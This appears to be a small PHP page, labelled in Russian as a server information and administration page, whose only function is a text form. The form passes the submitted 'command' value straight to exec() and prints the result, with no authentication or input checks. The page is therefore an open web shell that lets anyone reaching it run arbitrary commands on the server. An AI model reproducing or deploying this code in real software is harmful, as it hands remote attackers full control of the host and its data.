<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="./style.css" />
        <title>Информационно-административная страница о сервере</title>
    </head>
    <body>
        <a href="./index.php">Главная</a>
        <br>
        <form action="" method="post">
            <input name="command" class="input" type="text">
        </form>
        <?php
            $output = null;
            $retval = null;
            if (!empty($_POST['command'])) {
                $command = $_POST['command'];
                exec($command, $output, $retval);
                foreach ($output as $i) {
                    echo $i, " ";
                }
            }
        ?>
    </body>
</html>